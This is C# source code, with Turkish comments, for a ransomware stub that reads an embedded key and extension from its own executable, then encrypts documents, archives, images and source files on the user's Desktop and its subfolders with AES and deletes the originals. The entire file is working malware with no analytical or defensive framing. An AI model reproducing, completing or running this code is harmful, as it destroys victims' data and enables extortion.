using System;
using System.Linq;
using System.Text;


namespace Ran
{
    class Program
    {
        private static readonly byte[] @byte = new byte[] { 0x26, 0xdc, 0xff, 0x00, 0xad, 0xed, 0x7a, 0xee, 0xc5, 0xfe, 0x07, 0xaf, 0x4d, 0x08, 0x22, 0x3c };

        public static void KriptoFile(string dosyalar , string password = "Doldurulmali" , string uzanti = ".uzanti")
        {

                System.Security.Cryptography.Rfc2898DeriveBytes rfc = new System.Security.Cryptography.Rfc2898DeriveBytes(password, @byte);
                System.IO.FileStream fs = new System.IO.FileStream(dosyalar + uzanti, System.IO.FileMode.Create);
                System.Security.Cryptography.RijndaelManaged rm = new System.Security.Cryptography.RijndaelManaged();
                System.Security.Cryptography.CryptoStream cs = new System.Security.Cryptography.CryptoStream(fs, rm.CreateEncryptor(rfc.GetBytes(32), rfc.GetBytes(16)), System.Security.Cryptography.CryptoStreamMode.Write);
                System.IO.FileStream fs2 = new System.IO.FileStream(dosyalar, System.IO.FileMode.Open, System.IO.FileAccess.Read);

                int temp;
                temp = fs2.ReadByte();
                while (temp != -1)
                {
                        cs.WriteByte((byte)temp);
                        temp = fs2.ReadByte();
                }
                

                    //Close işlemleri , silmeyin. Mümkünse hiç bi' yeri ellemeyin.  

                cs.Close();
                fs.Close();
                fs2.Close();
                System.IO.File.Delete(dosyalar); //Bu biraz farklı , ilk önce dosyaların kopyasını oluşturup şifreler. Daha sonra siler.

        }


        static void Main(string[] args)
        {
            var executablename = System.AppDomain.CurrentDomain.FriendlyName;
            executablename = executablename.Replace("vshost.","");

            System.IO.StreamReader sr = new System.IO.StreamReader(Environment.CurrentDirectory + "/" + executablename);
            System.IO.StreamReader sr2 = new System.IO.StreamReader(Environment.CurrentDirectory + "/" + executablename);

            string readkey = sr.ReadToEnd();
            string readextension = sr2.ReadToEnd();
            
            
            try
            {
                readkey = readkey.Substring(readkey.IndexOf("-STARTKEY-"), readkey.IndexOf("-ENDKEY-") - readkey.IndexOf("-STARTKEY-"));
                readkey = readkey.Replace("-STARTKEY-", "");
                readextension = readextension.Substring(readextension.IndexOf("-STARTEXTENSION"), readextension.IndexOf("-ENDEXTENSION-") - readextension.IndexOf("-STARTEXTENSION-"));
                readextension = readextension.Replace("-STARTEXTENSION-", "");
            }

            catch
            {
                Console.Write("STUB'ı açmayın.");
                Console.ReadKey();
            }

            sr.Close();
            sr2.Close();




            string[] Uzantilar = {".txt",".rar",".zip",".doc",".docx",".html",".php",".css",".c",".cpp",".png",".jpg"};
            var yol = System.Environment.GetFolderPath(System.Environment.SpecialFolder.Desktop);

            string[] dosyalar = System.IO.Directory.GetFiles(yol);
            string[] klasorler = System.IO.Directory.GetDirectories(yol);

            for(int i = 0; i < dosyalar.Length; ++i)
            {
                string temp = System.IO.Path.GetExtension(dosyalar[i]);

                if (Uzantilar.Contains(temp))
                    KriptoFile(dosyalar[i],readkey,readextension);
            }
            
            for(int i = 0; i < klasorler.Length; ++i)
            {
                dosyalar = System.IO.Directory.GetFiles(klasorler[i]);

                for(int j = 0; j < dosyalar.Length; ++j)
                {
                    string temp = System.IO.Path.GetExtension(dosyalar[j]);
                    if (Uzantilar.Contains(temp))
                        KriptoFile(dosyalar[j], readkey,readextension);
                }
            }   
        }
    }
}
